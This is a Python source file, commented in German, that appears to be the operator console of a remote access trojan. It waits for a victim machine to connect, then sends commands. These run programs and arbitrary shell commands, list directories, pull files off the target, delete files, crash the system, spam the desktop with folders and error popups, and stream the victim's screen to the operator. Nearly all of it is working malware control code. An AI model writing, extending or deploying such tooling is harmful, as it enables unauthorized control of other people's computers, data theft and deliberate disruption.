import subprocess
import os
import socket
import threading
from vidstream import *


#Verbindung aufbauen
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 22
s.bind((host,port))
print("")
print("server leuft auf @", host)
print("warten auf einkommende verbindungen...")
s.listen(1)
conn, addr = s.accept()
print("")
print(addr, "Hat sich erfolgreich mit dem Server verbunden")
print("")



print(s.getsockname()[0])

#command handling

while 1:
    print("view_cwd, custom_dir, run, cmd, download_files, crash, spam_desktop, error, screenshare(only if python is installed on target machine) ")
    command = input(str("command >> "))
    #View_cwd
    if command == "view_cwd":
        conn.send(command.encode())
        print("Befehl wurde gesendet warte auf ausführung...")
        print("")
        print("Befehl wurde erfolgreich ausgeführt")
        files = conn.recv(20000)
        files = files.decode()
        print("Ausgabe aus befehl: ", files)

    #Beliebiges verzeichniss dateien anzeigen
    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("Verzeichniss: "))
        conn.send(user_input.encode())
        print("")
        print("Befehl wurde gesendet warte auf ausführung...")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Beliebiges verzeichniss", files)

    elif command == "run":
        conn.send(command.encode())
        print("")
        user_input = input(str("Was möchtest du ausführen (Inklusive endung): "))
        conn.send((user_input.encode()))
        print("Befehl wurde gesendet warte auf ausführung...")
        print("")
        print("Befehl ausgeführt!")

    elif command == "download_file":
        conn.send(command.encode())
        filepath = input(str("Filepath eingeben mit dem Filenamen: "))
        conn.send(filepath.encode())
        print("")
        print("Befehl wurde gesendet warte auf ausführung...")
        print("")
        file = conn.recv(10000)
        print(file)
        filename = input(str("Bitte ein Dateiname für die Inkommende datei angeben inklusive dateiendung z.B. .txt: "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print(filename, "wurde heruntergeladen und gespeichert ")


    elif command == "remove_file":
        conn.send(command.encode())
        fileanddir = input(str("Filepath eingeben mit dem Filenamen: "))
        conn.send(fileanddir.encode())
        print("")
        print("Die Datei wurde erfolgreich gelöscht.")

    elif command == "crash":
        conn.send(command.encode())
        print("")
        print("Das System wird gecrashed.")

    elif command == "spam_desktop":
        conn.send(command.encode())
        Anzahl = input(str("wie viele ordner sollten erstellt werden?: "))
        conn.send((Anzahl.encode()))
        name = input(str("Wie sollen die Ordner benannt werden?: "))
        conn.send((name.encode()))
        print("")
        print("Desktop wird voll gespamed.")

    elif command == "cmd":
        conn.send(command.encode())
        print("")
        user_input = input(str("Was möchtest du in CMD eingeben?: "))
        conn.send((user_input.encode()))
        print("Befehl wurde gesendet warte auf ausführung...")
        cmd = conn.recv(10000)
        cmd = cmd.decode()
        print("")
        print("ausgabe: ", cmd)


    elif command == "error":
        conn.send(command.encode())
        Anzahl = input(str("wie viele error Meldungen sollten erstellt werden?: "))
        conn.send((Anzahl.encode()))
        print("")
        print("Errors werden erstellt.")


    elif command == "screenshare":
        conn.send(command.encode())
        ip = conn.recv(5000)
        receiver = StreamingServer('10.0.10.47', 9999)
        t = threading.Thread(target=receiver.start_server)
        t.start()

        while input("") != 'STOP':
            continue
        receiver.stop_server()
        print("")


    #Befehl nicht gefunden
    else:
        print("")
        print("Befehl wurde nicht gefunden")

print("connection closed!")